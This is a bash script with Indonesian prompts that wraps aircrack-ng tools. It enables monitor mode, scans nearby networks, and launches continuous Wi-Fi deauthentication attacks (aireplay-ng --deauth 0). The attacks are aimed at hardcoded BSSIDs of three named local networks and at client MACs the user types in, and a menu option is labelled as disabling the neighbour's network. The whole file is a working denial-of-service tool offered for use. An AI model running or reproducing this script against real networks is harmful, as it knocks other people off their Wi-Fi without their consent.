#!/bin/bash

#
# Artawgn
# Program ini uji coba di Ubuntu 16.04
# 
#

#color
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"

main(){

	clear
	echo "==========================";
	#sudo airmon-ng;
	cekInterface;
	echo -e "$white========================== $Cafe";
	echo -e "1. Hidupkan Monitor";  
	echo -e "2. Matikan Monitor";  
	echo -e "3. Scan Sekitar";
	echo -e "4. Lumpuhkan <samping>";
	echo -e "0. Keluar $white"; 
	echo "==========================";
	read  -p "Pilih  : " a
	if [[ $a == 1 ]]; then
		hidup
		main
	elif [[ $a == 2 ]]; then
		mati;
		main;
	elif [[ $a == 3 ]]; then
		# sudo airodump-ng mon0;
		pilihScan;
	elif [[ $a == 4 ]]; then
		bunuh;
	elif [[ $a == 0 ]]; then
		clear
		echo ""
		echo " [ Sampai Jumpa! ]"
		echo ""
		exit 1
	else
		
		main
		echo "Input 1-5  !";
	fi
}

bunuh(){
	sudo aireplay-ng --deauth 0 -a 50:64:2B:25:F8:AB --ignore-negative-one mon0
	
	
}

hidup(){
	t1=$(ifconfig | grep -o mon0)
	t2='mon0'

	if [ "$t1" = "$t2" ]; then
	  main
	else
	  sudo airmon-ng start wlp9s0;
	  main;
	fi
}


mati(){
	sudo airmon-ng stop mon0;
}


status(){
	sudo airmon-ng
}
loading(){
	clear;
	echo	"Loading ";
	echo -ne '##                        (10%)\r'
	sleep 0.2
	echo -ne '#########                 (40%)\r'
	sleep 0.2
	echo -ne '###############           (80%)\r'
	sleep 0.2
	echo -ne '#####################     (90%)\r'
	sleep 0.2
	echo -ne '######################### (100%)\r'
	sleep 0.2
	echo -ne '\n'	
}
serang(){
	read  -p "INPUT MAC Target :" korban
	sudo aireplay-ng --deauth 0 -a $target -c $korban --ignore-negative-one mon0
	main;
}

pilihScan(){
	t1=$(ifconfig | grep -o mon0)
	t2='mon0'

	if [ "$t1" = "$t2" ]; then
	  	sudo airodump-ng mon0;
	  	echo "";
		echo  "1 = BUjANGRESIDENCE";
		echo  "2 = BUjANGRESIDENCE_plus";
		echo  "3 = SoffA";
		read  -p "Pilih  : " pilih
		if [[ $pilih == 1 ]]; then
			target="98:DE:D0:BD:0F:E0";
		elif [[ $pilih == 2 ]]; then
			target="50:64:2B:25:F8:AB";
		elif [[ $pilih == 3 ]]; then
			target="34:CE:00:7A:8D:60";
	    fi
		sudo airodump-ng --bssi $target mon0
		
		read  -p "Ingin Melakukan Serangan? (Y/N) : " serang
		if [[ $serang == y ]]; then
			serang;
		elif [[ $serang == Y ]]; then
			serang;
		elif [[ $serang == N ]]; then
			main;
		elif [[ $serang == n ]]; then
			main;
		fi
	else
	  	echo -e "$red Maaf Monito belum Aktif \033[1;m";
	  	echo -e "$red Untuk mengaktifkan teken 1 pada menu $white";
	  	echo ""
	  	read -p "Tekan enter untuk ke menu"
	  	main
	fi
	
}

cekInterface(){
	t1=$(ifconfig | grep -o mon0)
	t2='mon0'

	if [ "$t1" = "$t2" ]; then
	  echo -e "$green+ Mode Monitor Aktif \033[1;m";
	else
	  echo -e "$red+ Mode Monitor Tidak Aktif \033[1;m";
	fi
}

#mengecek user
if [[ $EUID -ne 0 ]]; then
   echo "<<< Kamu harus dalam keadaan root!>>>" 
   exit 1
fi
loading;
main;




